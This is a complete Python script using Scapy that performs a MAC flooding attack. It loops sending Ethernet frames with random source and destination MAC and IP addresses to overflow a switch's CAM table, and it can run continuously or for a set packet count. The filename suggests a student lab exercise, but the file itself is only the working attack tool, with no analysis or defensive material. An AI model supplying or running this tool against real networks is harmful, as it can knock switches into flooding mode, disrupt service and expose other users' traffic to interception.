#!/usr/bin/env python3
import sys
import time
import signal
from scapy.all import Ether, IP, sendp, RandMAC, RandIP
paquetes_enviados = 0
INTERFAZ = ""
def salida_limpia(sig, frame):
    print(f"\n[+] Ataque detenido.")
    print(f"[+] Total de paquetes enviados: {paquetes_enviados}")
    sys.exit(0)
def lanzar_ataque(interfaz, cantidad):
    global paquetes_enviados, INTERFAZ
    INTERFAZ = interfaz
    print(f"[*] Iniciando MAC Flooding en {interfaz}...")
    if cantidad == 0:
        print("[*] Modo continuo activado. Presiona Ctrl+C para detener.")
    else:
        print(f"[*] Se enviaran {cantidad} paquetes.")
    print("[*] Inundando tabla CAM del switch con MACs aleatorias...")
    signal.signal(signal.SIGINT, salida_limpia)
    while True:
        pkt = Ether(src=RandMAC(), dst=RandMAC()) / IP(src=RandIP(), dst=RandIP())
        sendp(pkt, iface=interfaz, verbose=False)
        paquetes_enviados += 1
        print(f"\r[>] Paquetes enviados: {paquetes_enviados}", end="", flush=True)
        if cantidad > 0 and paquetes_enviados >= cantidad:
            print(f"\n[+] Se enviaron {paquetes_enviados} paquetes.")
            print("[+] Ataque finalizado.")
            sys.exit(0)
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python3 JonathanRondon_20250737_MAC_Flooding.py <interfaz> [cantidad]")
        print("     cantidad = 0 o sin especificar -> modo continuo")
        sys.exit(1)
    interfaz = sys.argv[1]
    cantidad = int(sys.argv[2]) if len(sys.argv) >= 3 else 0
    lanzar_ataque(interfaz, cantidad)